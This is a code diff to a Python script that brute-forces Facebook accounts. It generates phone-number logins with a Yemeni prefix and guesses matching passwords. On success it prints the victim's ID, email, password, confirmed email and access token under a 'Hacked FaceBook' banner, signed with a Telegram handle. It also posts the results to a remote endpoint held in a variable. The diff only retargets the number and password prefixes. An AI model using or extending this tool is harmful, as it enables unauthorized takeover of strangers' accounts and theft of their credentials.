@@ -26,9 +26,9 @@ def code_whisper(email,password):
     i = requests.post(tlg)
     print(f'{G}.💀. Hacked FaceBook .💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.❤. ID ==> {id}\n.✉. E-mail ==> {email} \n.🚫. PassWord ==> {password}\n.📨. Confirmed E-mail ==> {con}\n.📃. Access Token ==> {tkn} \n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈. Tele ==> @itzthedevil')
 while True:
-    whisper = str("".join(random.choice(user)for i in range(8)))
-    email= '+96477'+whisper
-    password = '077'+whisper
+    whisper = str("".join(random.choice(user)for i in range(7)))
+    email= '+96777'+whisper
+    password = '77'+whisper
     if email =='':
         exit()
     if password =='':
